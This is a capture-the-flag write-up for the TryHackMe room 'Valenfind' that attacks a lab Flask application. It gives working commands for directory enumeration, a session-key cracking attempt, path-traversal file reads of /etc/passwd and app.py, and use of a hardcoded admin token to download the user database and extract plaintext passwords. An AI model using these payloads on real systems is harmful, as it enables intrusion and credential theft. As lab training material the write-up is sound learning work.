---
title: "TryHackMe - Valenfind"
date: 2026-02-14
tags: ["tryhackme", "medium", "lfi", "flask", "web", "gobuster", "sqlite"]
difficulty: "medium"
platform: "TryHackMe"
time_taken: "45 minutes"
draft: false
---

## Overview

Valenfind is a Valentine's Day themed medium-difficulty room featuring a Flask web application. The attack chain involves directory enumeration, Flask session analysis, exploiting a Local File Inclusion vulnerability to read the application source code, and finally leveraging a hidden admin API endpoint to dump the SQLite database and retrieve credentials.

---

## Reconnaissance

Starting with a Gobuster scan against the Flask application running on port 5000:

```bash
gobuster dir -u http://10.64.147.17:5000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x html,js,py,php,txt \
  -t 100
```

This revealed four endpoints:

| Endpoint | Status | Notes |
|---|---|---|
| `/login` | 200 | Login page |
| `/register` | 200 | Registration page |
| `/dashboard` | 302 → `/login` | Requires authentication |
| `/logout` | 302 → `/` | Session management present |

After registering an account and logging in, a session cookie was issued:

```
session=eyJ1c2VybmFtZSI6InNtaXRoaCJ9.aZBRFA.ojjaUStoc0eheOW-bvEUnt6jG9s
```

The cookie is a standard Flask signed session token. Decoding the base64 payload reveals:

```json
{"username": "smithh"}
```

Re-running Gobuster with the authenticated session cookie to enumerate protected routes:

```bash
gobuster dir -u http://10.64.147.17:5000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 100 \
  -c 'session=eyJ1c2VybmFtZSI6InNtaXRoaCJ9.aZBRFA.ojjaUStoc0eheOW-bvEUnt6jG9s'
```

---

## Flask Session Analysis

Noting that the secret key could potentially be weak, I attempted to crack it using `flask-unsign`:

```bash
pip install flask-unsign[wordlist] --break-system-packages

flask-unsign --unsign \
  --cookie "eyJ1c2VybmFtZSI6InNtaXRoaCJ9.aZBRFA.ojjaUStoc0eheOW-bvEUnt6jG9s" \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --no-literal-eval
```

> **Note:** The `--no-literal-eval` flag is required to prevent flask-unsign from choking on numeric wordlist entries being evaluated as integers.

This turned out to be a dead end — inspection of the source code later revealed the app uses `os.urandom(24)` for the secret key, meaning it's randomised on every restart and cannot be cracked.

---

## Local File Inclusion

Inspecting the JavaScript on the dashboard revealed a commented vulnerability in the theme loading functionality:

```javascript
// Feature: Dynamic Layout Fetching
// Vulnerability: 'layout' parameter allows LFI
fetch(`/api/fetch_layout?layout=${layoutName}`)
```

The `/api/fetch_layout` endpoint fetches files server-side based on the `layout` parameter with no path sanitisation. Testing confirmed the vulnerability:

```bash
curl -s -b "session=..." \
  "http://10.64.147.17:5000/api/fetch_layout?layout=../../../etc/passwd"
```

The error messages from failed attempts revealed the application's full path on disk:

```
Error loading theme layout: [Errno 2] No such file or directory: 
'/opt/Valenfind/templates/components/../main.py'
```

This told us the app lives at `/opt/Valenfind/`. Using this knowledge to read the main application file:

```bash
curl -s -b "session=..." \
  "http://10.64.147.17:5000/api/fetch_layout?layout=../../app.py"
```

---

## Source Code Review

Reading `app.py` revealed several critical findings:

**1. The secret key is randomised — session forging is not possible:**
```python
app.secret_key = os.urandom(24)
```

**2. The database filename:**
```python
DATABASE = 'cupid.db'
```

**3. A hardcoded admin API key:**
```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

**4. A hidden admin endpoint that serves the entire database:**
```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
```

**5. The `.db` filter that was blocking direct LFI of the database:**
```python
if 'cupid.db' in layout_file or layout_file.endswith('.db'):
    return "Security Alert: Database file access is strictly prohibited."
```

---

## Database Dump & Flag

With the admin API key in hand, downloading the full database is trivial:

```bash
curl -s -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
  "http://10.64.147.17:5000/api/admin/export_db" -o cupid.db
```

Reading the credentials from the database:

```bash
sqlite3 cupid.db "SELECT username, password FROM users;"
```

This returned plaintext credentials for all users including `cupid`. Logging in as `cupid` and navigating to their profile revealed the flag.

**Flag:** `THM{REDACTED}`

---

## Key Takeaways

- **Error messages are gold.** The LFI errors leaked the full server path (`/opt/Valenfind/`) which made navigating the filesystem trivial.
- **Read the source.** Once LFI was confirmed, reading `app.py` short-circuited everything — the admin key, database name, and hidden endpoint were all sitting there.
- **Hardcoded secrets are a critical vulnerability.** The `CUPID_MASTER_KEY_2024_XOXO` API key in source gave full database access in a single request.
- **Don't store passwords in plaintext.** The database contained unhashed passwords, meaning credential extraction required no cracking at all.
